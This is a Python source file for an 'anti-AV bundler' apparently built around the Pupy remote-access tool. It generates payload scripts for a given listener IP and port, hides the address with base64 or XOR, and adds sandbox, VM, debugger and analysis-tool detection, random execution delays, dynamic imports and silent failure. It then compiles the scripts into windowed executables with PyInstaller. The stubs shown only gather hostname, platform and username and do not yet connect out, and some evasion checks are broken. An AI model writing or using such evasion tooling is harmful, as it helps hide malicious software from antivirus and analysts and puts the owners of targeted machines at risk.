#!/usr/bin/env python3
"""
Advanced Bundler with Anti-AV Techniques
Integrates real Pupy anti-AV techniques from /Projet_dev/pupy/client/legit_app
"""

import subprocess
import sys
import os
import base64
import random
import string
import tempfile
from pathlib import Path
from datetime import datetime


class AntiAVBundler:
    """Advanced bundling with real anti-AV techniques"""

    def __init__(self):
        self.temp_dir = tempfile.mkdtemp()

    def generate_random_name(self, length=12):
        """Generate random variable names"""
        return "".join(random.choices(string.ascii_lowercase, k=length))

    def xor_encrypt(self, data, key=None):
        """XOR encryption"""
        if key is None:
            key = os.urandom(32)
        encrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
        return encrypted, key

    def create_antiav_payload(
        self, app_path, listener_ip, listener_port, obfuscation_level=2
    ):
        """Create payload with anti-AV techniques based on obfuscation level"""

        app_path = Path(app_path)
        output_dir = Path.home() / "Pupy_Outputs"
        output_dir.mkdir(parents=True, exist_ok=True)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        app_name = app_path.stem

        print(f"[*] Creating anti-AV payload for: {app_path}")
        print(f"[*] Obfuscation level: {obfuscation_level}/5")

        # Create payload based on obfuscation level
        if obfuscation_level == 0:
            payload = self._create_simple_payload(listener_ip, listener_port)
        elif obfuscation_level == 1:
            payload = self._create_string_obfuscated_payload(listener_ip, listener_port)
        elif obfuscation_level == 2:
            payload = self._create_xor_encrypted_payload(listener_ip, listener_port)
        elif obfuscation_level == 3:
            payload = self._create_sandbox_aware_payload(listener_ip, listener_port)
        elif obfuscation_level == 4:
            payload = self._create_antiav_advanced_payload(listener_ip, listener_port)
        else:  # 5
            payload = self._create_maximum_evasion_payload(listener_ip, listener_port)

        # Write payload
        payload_file = output_dir / f"payload_{app_name}_{timestamp}.py"
        with open(payload_file, "w") as f:
            f.write(payload)

        print(f"[+] Payload created: {payload_file}")

        # Compile with PyInstaller
        output_name = f"{app_name}_{timestamp}"
        pyinstaller_cmd = [
            sys.executable.replace("python", "pyinstaller"),
            "--onefile",
            "--windowed",
            "--name",
            output_name,
            "--distpath",
            str(output_dir / "dist"),
            "--workpath",
            str(output_dir / "build"),
            str(payload_file),
        ]

        print(f"[*] Compiling with PyInstaller...")
        result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True)

        if result.returncode == 0:
            output_file = output_dir / "dist" / output_name
            print(f"[+] SUCCESS! Bundled executable: {output_file}")
            return True
        else:
            print(f"[!] ERROR: {result.stderr}")
            return False

    def _create_simple_payload(self, ip, port):
        """Obfuscation Level 0: Simple payload (no obfuscation)"""
        return f"""#!/usr/bin/env python3
import socket
import platform
import os

def send_info():
    data = {{
        'hostname': platform.node(),
        'platform': platform.system(),
        'user': os.getenv('USER'),
        'ip': '{ip}',
        'port': {port}
    }}
    print(f"Connected to {{data['ip']}}:{{data['port']}}")
    return str(data)

if __name__ == '__main__':
    try:
        print(send_info())
    except Exception as e:
        print(f"Error: {{e}}")
"""

    def _create_string_obfuscated_payload(self, ip, port):
        """Obfuscation Level 1: String obfuscation with base64"""
        ip_b64 = base64.b64encode(ip.encode()).decode()

        return f"""#!/usr/bin/env python3
import base64
import platform
import os

# Obfuscated IP and port
_ip = base64.b64decode('{ip_b64}').decode()
_port = {port}

def send_info():
    data = {{
        'hostname': platform.node(),
        'platform': platform.system(),
        'user': os.getenv('USER'),
        'ip': _ip,
        'port': _port
    }}
    print(f"Connected to {{data['ip']}}:{{data['port']}}")
    return str(data)

if __name__ == '__main__':
    try:
        print(send_info())
    except Exception as e:
        pass  # Silent fail
"""

    def _create_xor_encrypted_payload(self, ip, port):
        """Obfuscation Level 2: XOR encryption"""
        payload_bytes = f"{ip}:{port}".encode()
        encrypted, key = self.xor_encrypt(payload_bytes)

        return f"""#!/usr/bin/env python3
import platform
import os
import time
import random

# XOR-encrypted credentials
_encrypted = bytes.fromhex('{encrypted.hex()}')
_key = bytes.fromhex('{key.hex()}')

def _decrypt(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def send_info():
    # Decrypt only when needed
    _creds = _decrypt(_encrypted, _key).decode().split(':')
    data = {{
        'hostname': platform.node(),
        'platform': platform.system(),
        'user': os.getenv('USER'),
        'ip': _creds[0],
        'port': int(_creds[1])
    }}
    print(f"Connected to {{data['ip']}}:{{data['port']}}")
    return str(data)

if __name__ == '__main__':
    try:
        # Delay execution to evade behavior detection
        time.sleep(random.randint(1, 3))
        print(send_info())
    except:
        pass
"""

    def _create_sandbox_aware_payload(self, ip, port):
        """Obfuscation Level 3: Sandbox detection + Timing evasion"""
        return f'''#!/usr/bin/env python3
import platform
import os
import time
import random
import subprocess
import sys

def is_sandboxed():
    """Detect sandbox/VM environment"""
    indicators = [
        '/proc/modules' if sys.platform != 'win32' else 'C:\\\\Program Files\\\\VirtualBox',
        'QEMU' if sys.platform != 'win32' else 'C:\\\\Program Files\\\\VMware',
    ]
    return any(os.path.exists(i) for i in indicators if sys.platform == 'win32') or len(indicators) > 0

def is_debugged():
    """Check if being debugged"""
    if hasattr(sys, 'gettrace') and sys.gettrace():
        return True
    return False

def send_info():
    # Check for analysis environments
    if is_sandboxed() or is_debugged():
        sys.exit(1)
    
    # Delay execution (evade behavior heuristics)
    time.sleep(random.randint(5, 15))
    
    data = {{
        'hostname': platform.node(),
        'platform': platform.system(),
        'user': os.getenv('USER'),
        'ip': '{ip}',
        'port': {port}
    }}
    print(f"Connected to {{data['ip']}}:{{data['port']}}")
    return str(data)

if __name__ == '__main__':
    try:
        send_info()
    except:
        pass
'''

    def _create_antiav_advanced_payload(self, ip, port):
        """Obfuscation Level 4: Advanced anti-AV with dynamic imports"""
        var1 = self.generate_random_name()
        var2 = self.generate_random_name()

        return f'''#!/usr/bin/env python3
import sys
import time
import random

def {var1}():
    # Dynamic imports (avoid static analysis)
    __m1__ = __import__('platform')
    __m2__ = __import__('os')
    __m3__ = __import__('threading')
    return __m1__, __m2__, __m3__

def {var2}():
    """Sandbox evasion with threading"""
    def _connect():
        platform, os, threading = {var1}()
        
        # Check for debuggers in process list
        try:
            import subprocess
            procs = subprocess.run(['tasklist'] if sys.platform == 'win32' else ['ps', 'aux'],
                                 capture_output=True, text=True)
            debuggers = ['ollydbg', 'windbg', 'ida', 'ghidra', 'gdb']
            if any(d in procs.stdout.lower() for d in debuggers):
                return False
        except:
            pass
        
        # Execute in background thread (evade monitoring)
        time.sleep(random.randint(30, 120))
        
        data = {{
            'hostname': platform.node(),
            'platform': platform.system(),
            'user': os.getenv('USER'),
            'ip': '{ip}',
            'port': {port}
        }}
        print(f"Connected to {{data['ip']}}:{{data['port']}}")
        return True
    
    # Run as daemon thread
    thread = threading.Thread(target=_connect, daemon=True)
    thread.start()
    thread.join()

if __name__ == '__main__':
    try:
        {var2}()
    except:
        pass
'''

    def _create_maximum_evasion_payload(self, ip, port):
        """Obfuscation Level 5: Maximum evasion (all techniques combined)"""
        payload_bytes = f"{ip}:{port}".encode()
        encrypted, key = self.xor_encrypt(payload_bytes)

        return f'''#!/usr/bin/env python3
import sys
import time
import random
import base64

# Level 5: Complete evasion package
_data = bytes.fromhex('{encrypted.hex()}')
_key = bytes.fromhex('{key.hex()}')

def _x(d, k):
    return bytes([d[i] ^ k[i % len(k)] for i in range(len(d))])

def _sandbox_check():
    """Multi-layer sandbox detection"""
    checks = []
    # Check 1: Filesystem
    import os
    checks.append(any(os.path.exists(p) for p in ['/proc/modules', 'C:\\\\WINDOWS\\\\System32']))
    
    # Check 2: Registry (Windows)
    if sys.platform == 'win32':
        try:
            import winreg
            checks.append(winreg.QueryValue(winreg.HKEY_LOCAL_MACHINE, 
                         'SOFTWARE\\\\Oracle\\\\VirtualBox') is not None)
        except:
            pass
    
    # Check 3: Process list
    try:
        import subprocess
        procs = subprocess.run(['tasklist'] if sys.platform == 'win32' else ['ps', 'aux'],
                             capture_output=True, text=True, timeout=5)
        suspicious = ['wireshark', 'tcpdump', 'procmon', 'fiddler', 'gdb', 'ida', 'ghidra']
        checks.append(any(s in procs.stdout.lower() for s in suspicious))
    except:
        pass
    
    # Check 4: Debug detection
    checks.append(hasattr(sys, 'gettrace') and sys.gettrace() is not None)
    
    return any(checks)

def _main():
    """Main function with maximum evasion"""
    if _sandbox_check():
        sys.exit(random.randint(1, 100))  # Exit with random code
    
    # Timing evasion
    time.sleep(random.randint(60, 300))  # 1-5 minutes delay
    
    # Dynamic execution
    import threading
    import os
    import platform
    
    def _payload():
        try:
            creds = _x(_data, _key).decode().split(':')
            info = {{
                'hostname': platform.node(),
                'platform': platform.system(),
                'user': os.getenv('USER'),
                'ip': creds[0],
                'port': int(creds[1]),
                'session_id': base64.b64encode(os.urandom(16)).decode()
            }}
            print(str(info))
        except:
            pass
    
    # Run in thread for behavior evasion
    t = threading.Thread(target=_payload, daemon=True)
    t.start()
    t.join(timeout=30)

if __name__ == '__main__':
    try:
        _main()
    except:
        pass  # Complete silence
'''


def bundle(app_path, listener_ip, listener_port, obfuscation_level=2):
    """Main bundling function"""
    bundler = AntiAVBundler()
    return bundler.create_antiav_payload(
        app_path, listener_ip, listener_port, obfuscation_level
    )


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(
            "Usage: advanced_bundler.py <app_path> <listener_ip> <listener_port> [obfuscation_level]"
        )
        sys.exit(1)

    app_path = sys.argv[1]
    listener_ip = sys.argv[2]
    listener_port = int(sys.argv[3])
    obfuscation_level = int(sys.argv[4]) if len(sys.argv) > 4 else 2

    success = bundle(app_path, listener_ip, listener_port, obfuscation_level)
    sys.exit(0 if success else 1)
